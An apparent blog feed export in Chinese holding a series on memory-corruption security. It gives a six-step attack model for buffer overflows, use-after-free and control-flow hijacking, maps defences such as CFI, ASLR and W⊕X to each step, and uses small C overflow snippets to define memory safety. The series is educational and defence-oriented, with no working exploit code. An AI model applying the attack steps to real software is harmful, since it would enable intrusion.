&lt;p&gt;下面将针对攻击模型中实施的每个步骤介绍相对应的防御机制，每种防御机制对应每一步的攻击过程。&lt;br&gt;可以先去回顾一下 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-攻击模型&lt;/a&gt; 的完整实施过程。注意，以下介绍的防御机制并没有时序关系,以横向关系依次描述。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 1&amp;amp;2: Memory safety.&lt;/em&gt;&lt;/strong&gt; 考虑完整的内存安全性，空间错误和时域错误都需要阻止。类型安全（Type-safe)的语言通过检查数组边界并使用自动垃圾回收来实施空间与时域安全性。对于非类型安全语言，可嵌入reference monitor针对非安全代码实施类似的策略，对象可以是源码、中间语言、二进制。&lt;/p&gt;
&lt;p&gt;针对空间安全，可跟踪指针边界，将指针结构体的表示方法扩展，加入额外信息。但是这种需要源码标注(annotation)，对于庞大的代码基是不实用的，甚至会改变内存结构带来二进制兼容性问题。可参考 &lt;a href=&quot;https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CCured&lt;/a&gt; 项目。为解决兼容性问题，越来越多研究者开始追踪对象边界，不但要知道对象分配的内存区域边界，并利用指针运算而不是引用指针来保护指针边界。&lt;/p&gt;
&lt;p&gt;然而，检测边界并不能解决use-after-free, double-free(use-after-free的特列)问题. 此时，实施时域安全可作为补充。1）特殊的分配器：释放的内存只能被同类型对象重用并对齐。此策略可阻止user-after-free攻击，但对dangling pointers无效；2）基于对象的方法：利用影子内存标记每一块释放的内存位置，如果访问最近被释放的空间就能被检测到。著名的Valgrind内存检测就是利用此方法来检测user-after-free错误的。有关Valgrind的内存检测技术将会在后续的文章&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/20/valgrind-memory/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Valgrind内存检测&lt;/a&gt; 详细介绍。如果标记的内存区域重新被新的指针指向，对其的非法访问就检测不到了；3）基于指针的方法：同时维护指针的边界信息与内存分配信息实施全面的内存安全。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 3: 代码完整性(code integrity, 对应修改代码),代码指针完整性(code pointer integrity，对应修改代码指针)以及数据完整性（data integrity，对应修改数据变量).&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;代码完整性保证程序中的代码不可写性，可以将含有代码的所有内存页面设置为read-only,所有现代CPU都支持此操作。但是，代码完整性并不支持自我修改(self-modifying)的代码以及即时(Just-In-Time, JIT)编译。代码指针完整性保护指针不被修改，对于不变指针，如全局偏移表、虚拟函数表（vtable),可将其内存页设置read-only。但大部分指针，如定义的函数指针或保存的返回地址必须是可写的。另外，就算内存中所有的函数指针都能实施代码指针完整性，并不能防御use-after-free攻击，例如，通过悬挂指针读取错误的vtable&lt;br&gt;来改变程序的控制流并不会涉及内存中的覆盖代码指针操作。&lt;/p&gt;
&lt;p&gt;数据完整性的实施近似空间安全保护，但并没有实施时域安全保护。数据完整性包括基于对象的完整性保护以及基于points-to集合的完整性保护。基于对象的完整性保护利用静态指针分析来鉴别出不安全的指针集(比如可能会越界的指针)以及指针的points-to集合，然后在代码中插入用影子内存跟踪对象的创建与释放的代码，当对不安全的指针进行写操作或引用操作时会检测指针的位置是否标记在影子内存中。基于points-to集合的完整性保护在基于对象的完整性保护上加了一个限制，每个解引用只能写它自己指向的集合对象，是对其保护的加强。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 4: ISR(对应指针转向攻击者特定代码),ASLR（对应指向shellcode或者gadget的地址),DSR(对应解析输出的数据变量).&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ISR随机化系统指令来保护代码破坏攻击，随着硬件的更新与发展,ISR技术已经废弃；ASLR随机化代码和数据的存储位置来防御控制流劫持攻击，如果payload(指恶意代码中执行恶意操作的部分）在虚拟内存空间的地址不是固定的，攻击者就无法转移控制流。ASLR也是目前用来保护劫持攻击运用最广泛的技术，然后ASLR的随机化是可预测的，尤其是32位机器，heap-spraying以及JIT-spraying技术可以多次填充payload使随机化失效；&lt;/p&gt;
&lt;p&gt;DSR将存储在内存中的数据形式，而不是存储位置，进行随机化。它为每个变量,包括指针，生成不同的key并进行加密操作，数据的每次读取/存储操作都多了个加解密过程。该方法在代码注入之前都要对指针进行静态分析，overhead较大，但保护比较健壮，能有效防止信息泄露，还能防御控制流劫持以及数据攻击。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 5: 控制流完整性（control-flow integrity,对应利用间接跳转指令 call/jump 引用指针，利用返回指令引用指针)以及数据流完整性(data-flow integrity，对应引用破坏后的数据变量).&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;控制流完整性包括动态返回完整性以及静态控制流图完整性。前文提到的栈粉碎性保护机制不能保护间接调转（call and jump)，不能防御直接修改破坏以及信息泄露，但开销小，兼容性好，所以运用比较广泛。影子栈技术能够解决栈粉碎性保护的信息泄露以及直接修改破坏问题，它把返回地址存入隔离的影子栈中，当函数返回时，对原有栈和影子栈两处保存的值做比较，已保证不被篡改。为了防御控制流劫持，不但要保护返回值，还要保护间接跳转，静态控制流图完整性的方式标记所有的call,jump，并将其标记信息存储在特殊的影子内存中或直接放进代码里; 数据流完整性在数据被使用前，通过检查read指令检测数据是否被破坏。它使用静态points-to分析构建一个全局的可达定义集合（reaching definition sets)，保证数据变量最近一次被写是通过程序中的写指令写入的，而不是攻击者可控制的写入。有关reaching definition sets的定义可参考 &lt;a href=&quot;https://en.wikipedia.org/wiki/Reaching_definition&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wikipedia page on Reaching definition&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 6: 不可写数据策略(Non-executable data,对应执行注入的shellcode).&lt;/em&gt;&lt;/strong&gt;&lt;br&gt;Non-executable data 保护栈、堆之类的内存页面不可执行，只需要设置内存页面的执行位即可。实际上Non-executable data策略与代码完整性结合就是W⊕X机制。&lt;/p&gt;
&lt;p&gt;每个攻击过程对应的防御机制都已讲完。横向来看，所有攻击模型的每个步骤都有多个防御方法；纵向来看，每种攻击在不同的实施阶段也有不同的防御方法，如控制流劫持攻击，从Step1-6分别有，内存安全性机制（step 1-2),代码指针完整性(step 3),ASLR(step 4), 控制流完整性（step 5）以及不可写数据策略（step 6)不同的防御机制。要阻止某种攻击或多种攻击，需要结合多种防御机制，每种机制也都有其优势与弱点。评判防御机制的性质，可从以下方面去衡量，保护强度、误报率、漏报率、性能开销、内存开销、兼容性，是否模块化等。&lt;/p&gt;
&lt;p&gt;至此，内存持久战系列文章就到这里了，水平有限，很多不到位的地方欢迎补充修正。 回顾一下，最后用下面这张图总结，就清晰明了了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/memorywar.png&quot; alt=&quot;memorywar&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;References&quot;&gt;&lt;a href=&quot;#References&quot; class=&quot;headerlink&quot; title=&quot;References&quot;&gt;&lt;/a&gt;References&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Anatomy of a Stack Smashing Attack and How GCC Prevents It
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Return-oriented Programming: Exploitation without Code Injection&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Reference_monitor&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wikipedia page on reference monior&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CCured&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nebelwelt.net/publications/files/13Oakland.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;S&amp;amp;P’13 Eternal War in Memory &lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;] &lt;/p&gt;
&lt;p&gt;如转载本文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/23/memorywar-defense/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/02/23/memorywar-defense/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;继前两篇文章 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&quot;&gt;内存持久战-内存安全性&lt;/a&gt;, &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot;&gt;内存持久战-攻击模型&lt;/a&gt;, 再加上防御措施，才能算是完整的内存战争。本文首先介绍目前广泛部署的防御机制，然后根据 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot;&gt;内存持久战-攻击模型&lt;/a&gt; 每一步实施的攻击破坏介绍相对应的防御细节。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Memory" scheme="http://yoursite.com/tags/Memory/"/>
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
    
      <category term="Defense" scheme="http://yoursite.com/tags/Defense/"/>
    
  </entry>
  
  <entry>
    <title>Memory page classificatition</title>
    <link href="http://yoursite.com/blog/2016/02/20/memory-classification/"/>
    <id>http://yoursite.com/blog/2016/02/20/memory-classification/</id>
    <published>2016-02-21T03:03:23.000Z</published>
    <updated>2016-04-21T01:23:47.000Z</updated>
    
    <content type="html">&lt;p&gt;即将介绍内存页面分类技术&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;即将介绍内存页面分类技术&lt;/p&gt;

    
    </summary>
    
      <category term="operating-system" scheme="http://yoursite.com/categories/operating-system/"/>
    
    
  </entry>
  
  <entry>
    <title>Understanding your kernel oops</title>
    <link href="http://yoursite.com/blog/2016/02/20/kernel-opps/"/>
    <id>http://yoursite.com/blog/2016/02/20/kernel-opps/</id>
    <published>2016-02-21T03:01:20.000Z</published>
    <updated>2016-04-21T01:23:47.000Z</updated>
    
    <content type="html">&lt;p&gt;即将介绍下oops错误以及如何调试&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;即将介绍下oops错误以及如何调试&lt;/p&gt;

    
    </summary>
    
      <category term="debugging" scheme="http://yoursite.com/categories/debugging/"/>
    
    
  </entry>
  
  <entry>
    <title>Valgrind 内存检测</title>
    <link href="http://yoursite.com/blog/2016/02/20/valgrind-memory/"/>
    <id>http://yoursite.com/blog/2016/02/20/valgrind-memory/</id>
    <published>2016-02-21T02:55:45.000Z</published>
    <updated>2016-04-21T01:23:47.000Z</updated>
    
    <content type="html">&lt;p&gt;即将介绍&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;即将介绍&lt;/p&gt;

    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>内存持久战-攻击模型</title>
    <link href="http://yoursite.com/blog/2016/02/18/memorywar-attack/"/>
    <id>http://yoursite.com/blog/2016/02/18/memorywar-attack/</id>
    <published>2016-02-19T03:06:45.000Z</published>
    <updated>2016-04-26T00:27:50.000Z</updated>
    
    <content type="html">&lt;p&gt;内存破坏是计算机安全中亘古不变的话题。内存破坏也被看作是top three危险的软件错误。像C/C++这种底层语言很容易引来这些bugs. 这些程序语言无法对内存安全性的保证，以至于让一些攻击者利用内存bugs改变程序行为或甚至控制整个控制流（control-flow).  要了解什么是内存安全性，可参考上一篇文章：&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-内存安全性&lt;/a&gt;.  然而，一种最显而易见的解决方案就是避免这些容易引起内存破坏的程序语言，用一种内存安全的程序语言去重写这些程序。显然这是不切实际的，比如重写整个OS？&lt;br&gt;尽管papers的许多防御措施层出不穷，但大部分都无法应用到工业上，归结于以下问题：性能开销太大、与现有的程序特性并不兼容、不够健壮、不够完整、依赖于编译器或源码等等。&lt;br&gt;对内存的破坏与保护是一场持久战。本文重在总结利用内存破坏的相关攻击及其实施过程。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;基本攻击类型&quot;&gt;&lt;a href=&quot;#基本攻击类型&quot; class=&quot;headerlink&quot; title=&quot;基本攻击类型&quot;&gt;&lt;/a&gt;基本攻击类型&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;代码破坏攻击(Code corruption):  攻击者在内存中覆盖程序代码，执行自己写入的代码.&lt;/li&gt;
&lt;li&gt;数据流劫持（Control-flow hijack）: 攻击者重写程序的返回地址或跳转地址，转而执行自己的代码（shell code).&lt;/li&gt;
&lt;li&gt;数据攻击（Data-only attack）: 攻击者并不会修改程序控制流，而是操作程序中的关键数据获取额外权限或泄露重要信息。&lt;/li&gt;
&lt;li&gt;信息泄露（Information leak attack）:任何类型的内存错误都有可能导致内存内容的泄露 &lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;构建攻击模型&quot;&gt;&lt;a href=&quot;#构建攻击模型&quot; class=&quot;headerlink&quot; title=&quot;构建攻击模型&quot;&gt;&lt;/a&gt;构建攻击模型&lt;/h3&gt;&lt;p&gt;攻击者要实施一次完整的攻击，首先要触发内存错误，具体可按照以下六个步骤进行：&lt;br&gt;注：&lt;em&gt;Step 1&amp;amp;2&lt;/em&gt; 是上述攻击模型通用的过程，必不可少，目的是为了触发内存错误。至于 &lt;em&gt;Step 3-6&lt;/em&gt;，有些攻击需要完整的步骤才能执行，有些则在前几个阶段就可以完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 1: 让指针无效&lt;/em&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;要让指针无效，可以强制让指针越界（out of bounds)，引用越界指针引发空间错误（spatial error)。包括：触发未经过检测的空间分配失败错误（allocation failure),这时指针将变成空指针；在循环中不作边界检测，不断递增或递减数组指针，让指针指向数组边界之外的内存空间导致缓冲区溢出；索引越界，一般由整数溢出、截断、对齐、错误的指针映射导致。&lt;/p&gt;
&lt;p&gt;或可让指针指向已经被删除的对象,这时指针称为悬挂指针(dangling pointer).比如，利用不正确的异常处理器（exception handler)回收对象，但并不重新初始化指向这个对象的指针。&lt;br&gt;引用悬挂指针引发时域错误（temporal error). 时域错误也称为use-after-free漏洞，因为引用（used)悬挂指针是在指针指向的内存区域已经被回收（freed)到内存管理系统之后. 大部分此类的错误指针在heap上分配的对象，但局部变量的指针分配给全局变量后会造成指针逃逸(escape)出局部作用域，在函数返回或栈上的局部变量被删除后逃逸的指针将会变成悬挂指针。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 2: 强制让程序引用（读或写）无效指针&lt;/em&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 3: 利用无效指针修改对象&lt;/em&gt;&lt;/strong&gt;。修改的对象包括数据指针、代码指针、代码、数据变量，以及输出数据变量&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 4: 偏离源程序执行&lt;/em&gt;&lt;/strong&gt;。可将修改的对象转向攻击者特定的代码（code curruption attack)、也可指向shellcode或者gadget(指一些指令序列）的地址、修改变量特定值、解析输出的数据变量（information leak attack). 注：此时，code currupttion attack与information lead attack过程都已全部完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 5: 使用修改后的对象&lt;/em&gt;&lt;/strong&gt;。包括利用间接跳转指令 &lt;em&gt;call/jump&lt;/em&gt; 引用指针，利用返回指令引用指针，以及引用破坏后的数据变量（data-only attack).至此，数据攻击过程已全部完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 6: 执行恶意代码&lt;/em&gt;&lt;/strong&gt;。包括重用现有的函数/gadgets以及执行注入的shellcode(control-flow hijack).至此，control-flow hijack过程已全部完成。&lt;/p&gt;
&lt;p&gt;最后看两张图，分别是control-flow hijack利用越界指针与悬挂指针劫持控制流的完整过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/hijack-bound.png&quot; alt=&quot;hijack-bound&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/hijack-dangling.png&quot; alt=&quot;hijack-dangling&quot;&gt;&lt;/p&gt;
&lt;p&gt;既然谈论的是持久战，针对内存破坏相关攻击的防御措施将在下一篇文章&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/23/memorywar-defense/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-防御机制&lt;/a&gt;详细介绍。&lt;/p&gt;
&lt;h3 id=&quot;References&quot;&gt;&lt;a href=&quot;#References&quot; class=&quot;headerlink&quot; title=&quot;References&quot;&gt;&lt;/a&gt;References&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://nebelwelt.net/publications/files/13Oakland.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;S&amp;amp;P’13 Eternal War in Memory &lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h2&gt;&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;] &lt;/p&gt;
&lt;p&gt;转载本文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;内存破坏是计算机安全中亘古不变的话题。内存破坏也被看作是top three危险的软件错误。像C/C++这种底层语言很容易引来这些bugs. 这些程序语言无法对内存安全性的保证，以至于让一些攻击者利用内存bugs改变程序行为或甚至控制整个控制流（control-flow).  要了解什么是内存安全性，可参考上一篇文章：&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&quot;&gt;内存持久战-内存安全性&lt;/a&gt;.  然而，一种最显而易见的解决方案就是避免这些容易引起内存破坏的程序语言，用一种内存安全的程序语言去重写这些程序。显然这是不切实际的，比如重写整个OS？&lt;br&gt;尽管papers的许多防御措施层出不穷，但大部分都无法应用到工业上，归结于以下问题：性能开销太大、与现有的程序特性并不兼容、不够健壮、不够完整、依赖于编译器或源码等等。&lt;br&gt;对内存的破坏与保护是一场持久战。本文重在总结利用内存破坏的相关攻击及其实施过程。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Memory" scheme="http://yoursite.com/tags/Memory/"/>
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
    
  </entry>
  
  <entry>
    <title>内存持久战-内存安全性</title>
    <link href="http://yoursite.com/blog/2016/02/17/memory-safety/"/>
    <id>http://yoursite.com/blog/2016/02/17/memory-safety/</id>
    <published>2016-02-18T01:07:28.000Z</published>
    <updated>2016-04-26T00:47:28.000Z</updated>
    
    <content type="html">&lt;p&gt;C语言中的buffer overflows, format string attacks等其它的一些vulnerabilities都有一个共同的问题：违背内存安全(Memory Safety)。本文主要讲述如何准确定义内存安全，为什么这些vulnerabilities违背了内存安全。也为后续两篇文章&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-攻击模型&lt;/a&gt;，&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/23/memorywar-defense/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-防御机制&lt;/a&gt;做好铺垫。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;IEEE Security&amp;amp;Privacy’13&lt;/li&gt;
&lt;li&gt;不访问未定义的内存&lt;/li&gt;
&lt;li&gt;无限间距&lt;/li&gt;
&lt;li&gt;Pointers as capabilities&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;IEEE-Security-amp-Privacy’13&quot;&gt;&lt;a href=&quot;#IEEE-Security-amp-Privacy’13&quot; class=&quot;headerlink&quot; title=&quot;IEEE Security&amp;amp;Privacy’13&quot;&gt;&lt;/a&gt;IEEE Security&amp;amp;Privacy’13&lt;/h3&gt;&lt;p&gt;发表在IEEE Security&amp;amp;Privacy’13的一篇SoK(Systematization of Knowledge)文章，&lt;a href=&quot;https://nebelwelt.net/publications/files/13Oakland.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Eternal War in Memory &lt;/a&gt;，阐述了一种定义内存安全的通用方法。&lt;br&gt;&lt;strong&gt;&lt;em&gt;Definition 1:&lt;/em&gt;&lt;/strong&gt; 文中提到，一个程序的执行，只要不会出现以下内存访问错误，就是内存安全的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.缓冲区溢出&lt;/li&gt;
&lt;li&gt;2.引用空指针&lt;/li&gt;
&lt;li&gt;3.释放后使用（use after free）&lt;/li&gt;
&lt;li&gt;4.使用未初始化内存&lt;/li&gt;
&lt;li&gt;5.非法释放已经释放过的指针或未分配的指针&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;维基百科 &lt;a href=&quot;https://en.wikipedia.org/wiki/Memory_safety&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wikipedia page on memory safety&lt;/a&gt; 也有类似的定义。从定义来看，排除这些错误是内存安全本身的定义所导向的，而并非内存安全性的本质。那么，如何将这些错误统一起来？&lt;/p&gt;
&lt;h3 id=&quot;不访问未定义的内存&quot;&gt;&lt;a href=&quot;#不访问未定义的内存&quot; class=&quot;headerlink&quot; title=&quot;不访问未定义的内存&quot;&gt;&lt;/a&gt;不访问未定义的内存&lt;/h3&gt;&lt;p&gt;只有当程序访问未定义的内存时才会产生内存错误，这块内存是在程序中没有具体分配的，例如，&lt;em&gt;heap&lt;/em&gt; 的一部分（通过&lt;em&gt;malloc&lt;/em&gt;)，&lt;em&gt;stack&lt;/em&gt;(作为局部变量或者函数参数），又或者是静态数据区域（作为全局变量). &lt;a href=&quot;http://www.cs.berkeley.edu/~necula/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;George Necula&lt;/a&gt; 在他的&lt;em&gt;CCured&lt;/em&gt;项目中（旨在为C程序实施内存安全性）提到，一个内存安全的程序从来不会去访问未定义的内存。我们可以假设，内存可以无限的大，大到内存地址从不会复用(reused).如此一来，被释放的内存（可以调用&lt;em&gt;free&lt;/em&gt; 或者从函数返回的时候&lt;em&gt;pop&lt;/em&gt;）从不会被重新分配，并且会永久的保持未定义状态。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Definition 2:&lt;/em&gt;&lt;/strong&gt; 不访问未定义的内存就是内存安全的。&lt;br&gt;这种定义明显排除了&lt;em&gt;error 2&lt;/em&gt; 和 &lt;em&gt;error 3&lt;/em&gt;. 如果将&lt;em&gt;allocated&lt;/em&gt; 的定义包括&lt;em&gt;initialized&lt;/em&gt;，又可以排除&lt;em&gt;error 4&lt;/em&gt;. 如果假设&lt;em&gt;free&lt;/em&gt;只能在定义过的内存指针中调用，那又可以排除&lt;em&gt;error 5&lt;/em&gt;. &lt;/p&gt;
&lt;p&gt;不幸的是，&lt;em&gt;Definition 2&lt;/em&gt; 并未排除缓冲区溢出错误，也就是&lt;em&gt;error 1&lt;/em&gt;。 来看一个例子，假定一个标准&lt;em&gt;stack&lt;/em&gt; 布局， 在此定义下，&lt;em&gt;program 1&lt;/em&gt; 的执行会被认为是内存安全的：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/* Program 1 */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int buf[4];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;buf[5] =3; /*overwrite*/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;Definition 2&lt;/em&gt; 允许 &lt;em&gt;Program 1&lt;/em&gt; 通过是因为此程序是在合法分配的内存中写数据，甚至写的数据类型也是正确的。但实际上问题在于，数组&lt;em&gt;buf&lt;/em&gt; 的溢出将数据写进了变量&lt;em&gt;x&lt;/em&gt; 中, 显然这是内存不安全的。&lt;/p&gt;
&lt;h3 id=&quot;无限间距&quot;&gt;&lt;a href=&quot;#无限间距&quot; class=&quot;headerlink&quot; title=&quot;无限间距&quot;&gt;&lt;/a&gt;无限间距&lt;/h3&gt;&lt;p&gt;将 &lt;em&gt;Definition 2&lt;/em&gt; 延伸， &lt;em&gt;Program 1&lt;/em&gt; 被看作是内存不安全的。只要加上这个假设： 内存区域分配的间距是无限大的。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Buf&lt;/em&gt; 和 &lt;em&gt;x&lt;/em&gt; 的分配间距无限大，&lt;em&gt;buf[5]&lt;/em&gt; 将会访问 &lt;em&gt;buf&lt;/em&gt; 区域的边界外部。边界外部是个未定义的内存区域，按照上述定义，就会产生错误。&lt;em&gt;heap&lt;/em&gt; ,静态数据区域对溢出的处理方式类似。&lt;/p&gt;
&lt;p&gt;尽管 &lt;em&gt;Definition 2&lt;/em&gt; 是个很接近让人满意的定义，但事实并未如此。来看 &lt;em&gt;Program 1&lt;/em&gt; 的变形 &lt;em&gt;Program 2&lt;/em&gt;，也是一种缓冲区溢出, &lt;em&gt;Definition 2&lt;/em&gt;  仍然会允许 &lt;em&gt;Program 2&lt;/em&gt; 执行。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/*Program 2 */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;struct foo &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   int buf[4];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   int x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;struct foo *pf -malloc(sizeof(struct foo));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pf-&amp;gt;buf[5] =3;/*overwrite 